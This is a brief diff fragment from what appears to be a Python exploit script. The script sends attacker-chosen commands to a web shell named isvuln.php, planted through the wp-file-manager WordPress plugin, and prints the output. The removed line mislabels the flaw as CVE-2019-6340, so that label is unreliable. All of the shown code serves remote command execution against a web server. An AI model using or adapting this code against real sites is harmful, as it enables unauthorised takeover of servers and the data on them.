@@ -30,7 +30,6 @@ if  "isvuln" in response.text :
     shell_url = url + "/wp-content/plugins/wp-file-manager/lib/files/isvuln.php"
     data = {"cmd":cmd}
     re = requests.post(shell_url, data=data)
-    print "\n>>>>Exit CVE-2019-6340 RCE Vuln!\n"
     print re.content
       
 else:
